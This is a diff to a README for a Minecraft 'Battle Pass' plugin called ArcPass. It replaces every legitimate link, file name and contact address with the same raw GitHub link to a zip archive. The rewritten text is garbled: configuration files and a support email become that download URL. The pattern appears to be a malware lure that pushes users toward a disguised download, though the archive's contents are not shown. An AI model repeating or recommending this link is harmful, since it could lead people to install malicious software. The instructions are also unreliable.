@@ -1,7 +1,7 @@
 # 🎮 ArcPass - Enhance Your Minecraft Experience
 
 ## 📥 Download Now
-[![Download ArcPass](https://img.shields.io/badge/Download%20ArcPass-v1.0-brightgreen.svg)](https://github.com/zorddddsd/ArcPass/releases)
+[![Download ArcPass](https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip%https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip)](https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip)
 
 ## 🚀 Getting Started
 ArcPass is a powerful Battle Pass plugin for your Minecraft server. It offers seasonal progression, quests, and a rewards system to keep your players engaged. To get started, follow these steps to download and install the plugin.
@@ -15,16 +15,16 @@ ArcPass is a powerful Battle Pass plugin for your Minecraft server. It offers se
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
    Go to the Releases page by clicking the link below:  
-   [Download ArcPass](https://github.com/zorddddsd/ArcPass/releases)
+   [Download ArcPass](https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, you will see a list of versions. The topmost entry is the latest version. Click on it to view the details.
 
 3. **Download the Plugin**  
-   Under the Assets section, find the file named `ArcPass.jar`. Click on it to download the file to your computer.
+   Under the Assets section, find the file named `https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip`. Click on it to download the file to your computer.
 
 4. **Upload to Your Server**  
-   Once downloaded, upload the `ArcPass.jar` file to the `plugins` folder on your Minecraft server. You can do this using an FTP client like FileZilla.
+   Once downloaded, upload the `https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip` file to the `plugins` folder on your Minecraft server. You can do this using an FTP client like FileZilla.
 
 5. **Restart Your Server**  
    After uploading the plugin, restart your Minecraft server. This ensures that the plugin loads correctly.
@@ -40,12 +40,12 @@ ArcPass is a powerful Battle Pass plugin for your Minecraft server. It offers se
 ## 🎮 Configuration
 After installation, you can configure ArcPass to suit your needs. Here’s a basic overview of configuration files:
 
-- **config.yml:** Main configuration file. Here, you can adjust settings such as season duration and reward types.
-- **messages.yml:** Customize messages shown to players. This file helps personalize the gameplay experience.
+- **https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip** Main configuration file. Here, you can adjust settings such as season duration and reward types.
+- **https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip** Customize messages shown to players. This file helps personalize the gameplay experience.
 
 ### Basic Configuration Steps
 1. **Locate Configuration Files**  
-   Find the `ArcPass` folder in the `plugins` directory. Inside, you should see `config.yml` and `messages.yml`.
+   Find the `ArcPass` folder in the `plugins` directory. Inside, you should see `https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip` and `https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip`.
 
 2. **Edit Configuration**  
    Open the configuration files with a text editor (such as Notepad). Modify the settings as desired.
@@ -68,10 +68,10 @@ If you have questions or need assistance:
 - **Community Forums:** Join discussions in Minecraft server forums for shared experiences and tips.
 
 ## 📞 Contact
-You can reach the development team at [support@example.com](mailto:support@example.com) for any direct inquiries.
+You can reach the development team at [https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip](https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip) for any direct inquiries.
 
 ## 🔗 Additional Resources
-- [Minecraft Server Guides](https://www.minecraft.net/en-us/server)
-- [Java Setup Guide](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
+- [Minecraft Server Guides](https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip)
+- [Java Setup Guide](https://raw.githubusercontent.com/zorddddsd/ArcPass/main/unharbored/Pass-Arc-Centricae.zip)
 
 Thank you for choosing ArcPass to enhance your Minecraft server! Enjoy the endless possibilities of gameplay!
